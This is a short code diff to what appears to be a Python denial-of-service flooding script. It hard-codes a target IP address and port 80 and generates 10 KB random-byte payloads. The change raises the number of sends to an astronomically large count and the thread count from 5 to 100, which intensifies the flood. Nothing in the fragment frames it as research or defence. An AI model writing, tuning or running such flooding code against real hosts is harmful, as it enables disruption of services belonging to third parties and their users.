@@ -10,8 +10,8 @@ import time
 ip = '82.200.161.178'
 port = 80
 choice = '2'
-times = 100000000
-threads = 5
+times = 100000000000000000000000
+threads = 100
 def run():
 	data = random._urandom(10*1024)
 	i = random.choice(("[/]","[__]","[/]"))
